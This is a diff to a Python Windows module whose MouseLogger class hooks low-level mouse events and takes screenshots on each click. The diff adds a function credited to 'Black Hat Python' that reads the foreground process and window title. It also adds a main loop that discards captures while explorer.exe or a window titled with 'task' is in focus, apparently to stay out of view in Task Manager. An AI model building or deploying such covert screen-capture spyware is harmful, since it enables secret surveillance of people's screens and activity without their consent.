@@ -60,6 +60,8 @@ kernel32 = windll.kernel32
 WH_MOUSE_LL=14
 WM_MOUSEFIRST=0x0200
 
+psapi = windll.psapi
+current_window = None
 
 # Initilisations
 SM_XVIRTUALSCREEN = 76
@@ -172,7 +174,6 @@ class MouseLogger(threading.Thread):
 
 		return pixels.raw, height, width
 
-
 	def install_hook(self):
 		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
 		self.pointer = CMPFUNC(self.hook_proc)
@@ -194,10 +195,42 @@ class MouseLogger(threading.Thread):
 			self.screenshots.append((datetime.datetime.now(), height, width, buf))
 		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
+#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
+def get_current_process():
+	hwnd = user32.GetForegroundWindow()
+	
+	pid = c_ulong(0)
+	user32.GetWindowThreadProcessId(hwnd, byref(pid))
+	
+	#process_id = "%d" % pid.value
+	
+	executable = create_string_buffer("\x00" * 512)
+	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+	
+	window_title = create_string_buffer("\x00" * 512)
+	length = user32.GetWindowTextA(hwnd, byref(window_title),512)
+	
+	kernel32.CloseHandle(hwnd)
+	kernel32.CloseHandle(h_process)
+	#return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+	return executable.value, window_title.value
+
 if __name__=="__main__":
+	proc_blacklist = ['explorer.exe']
+	proc_whitelist = []# can expand on this
+
+	title_blacklist = set(['task'])
+	title_whitelist = set([])# can expand on this
+
 	ml = MouseLogger()
 	ml.start()
 	while True:
-		time.sleep(5)
-		for d, height, width, buf in ml.retrieve_screenshots():
-			print "screenshot of %s/%s taken at %s (%s bytes)"%(height, width, d, len(buf))
+		exe, win_title = get_current_process()
+		curr_title = set(win_title.lower().split())
+		if (exe.lower() in proc_blacklist) or (title_blacklist & curr_title):
+			ml.screenshots = []
+		else:
+			time.sleep(5)
+			for d, height, width, buf in ml.retrieve_screenshots():
+				print "screenshot of %s - %spx/%spx taken at %s (%s bytes)"%(win_title, height, width, d, len(buf))
